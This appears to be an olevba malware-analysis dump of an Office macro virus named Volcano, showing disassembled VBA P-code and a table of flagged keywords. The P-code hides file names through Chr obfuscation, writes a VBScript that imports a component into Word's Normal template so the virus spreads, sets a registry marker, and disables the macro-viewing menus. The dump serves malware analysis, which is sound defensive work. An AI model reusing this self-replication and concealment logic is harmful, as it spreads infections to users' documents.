' Line #140:
' 	Ld Caminho 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Set W = WScript.CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Word.Application"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "W.NormalTemplate.VBProject.VBComponents.Import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Caminho 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "W.Application.Quit"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #145:
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	EndSub 
' Line #149:
' 	FuncDefn (Sub r())
' Line #150:
' 	LitStr 0x0002 "rr"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Volcano?"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #151:
' 	EndSub 
' Line #152:
' Line #153:
' 	FuncDefn (Sub ToolsMacro())
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' 	FuncDefn (Sub FileTemplates())
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' 	FuncDefn (Sub ViewVBCode())
' Line #160:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Volcano.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

